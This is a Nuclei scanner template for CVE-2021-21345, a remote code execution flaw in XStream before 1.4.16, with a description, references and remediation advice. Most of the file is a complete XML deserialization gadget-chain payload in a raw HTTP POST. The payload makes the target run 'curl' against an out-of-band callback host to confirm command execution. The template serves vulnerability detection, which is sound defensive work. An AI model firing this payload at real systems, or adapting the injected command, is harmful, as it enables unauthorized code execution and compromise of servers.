http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<java.util.PriorityQueue\
    \ serialization='custom'>\n  <unserializable-parents/>\n  <java.util.PriorityQueue>\n\
    \    <default>\n      <size>2</size>\n      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n\
    \        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n \
    \         <packet>\n            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n\
    \              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>\n\
    \                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>\n\
    \                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>\n\
    \                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>\n\
    \                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>\n\
    \                      <uriProperties/>\n                      <attributeProperties/>\n\
    \                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>\n\
    \                        <getter>\n                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>\n\
    \                          <name>verify</name>\n                          <parameter-types/>\n\
    \                        </getter>\n                      </inheritedAttWildcard>\n\
    \                    </bi>\n                    <tagName/>\n                 \
    \   <context>\n                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>\n\
    \                        <outer-class reference='../..'/>\n                  \
    \    </marshallerPool>\n                      <nameList>\n                   \
    \     <nsUriCannotBeDefaulted>\n                          <boolean>true</boolean>\n\
    \                        </nsUriCannotBeDefaulted>\n                        <namespaceURIs>\n\
    \                          <string>1</string>\n                        </namespaceURIs>\n\
    \                        <localNames>\n                          <string>UTF-8</string>\n\
    \                        </localNames>\n                      </nameList>\n  \
    \                  </context>\n                  </bridge>\n                </bridge>\n\
    \                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>\n\
    \                  <activationCmd>curl http://{{interactsh-url}}</activationCmd>\n\
    \                </jaxbObject>\n              </dataSource>\n            </message>\n\
    \            <satellites/>\n            <invocationProperties/>\n          </packet>\n\
    \        </indexMap>\n      </comparator>\n    </default>\n    <int>3</int>\n\
    \    <string>javax.xml.ws.binding.attachments.inbound</string>\n    <string>javax.xml.ws.binding.attachments.inbound</string>\n\
    \  </java.util.PriorityQueue>\n</java.util.PriorityQueue>\n"
id: CVE-2021-21345
info:
  author: pwnhxl,vicrack
  classification:
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-21345
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
    cwe-id: CWE-78,CWE-502
    epss-percentile: 0.9721
    epss-score: 0.4876
  description: 'XStream before 1.4.16 is susceptible to remote code execution. An
    attacker who has sufficient rights can execute host commands via manipulating
    the processed input stream, thereby making it possible to obtain sensitive information,
    modify data, and/or execute unauthorized administrative operations.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    max-request: 1
    product: xstream
    vendor: xstream_project
  name: XStream <1.4.16  - Remote Code Execution
  reference:
  - https://x-stream.github.io/CVE-2021-21345.html
  - http://x-stream.github.io/changes.html#1.4.16
  - https://github.com/x-stream/xstream/security/advisories/GHSA-hwpc-8xqv-jvj4
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21345
  - https://lists.apache.org/thread.html/r8244fd0831db894d5e89911ded9c72196d395a90ae655414d23ed0dd@%3Cusers.activemq.apache.org%3E
  remediation: Install at least 1.4.16 if you rely on XStream's default blacklist
    of the Security Framework.
  severity: critical
  tags: cve2021,cve,xstream,deserialization,rce,oast,xstream_project
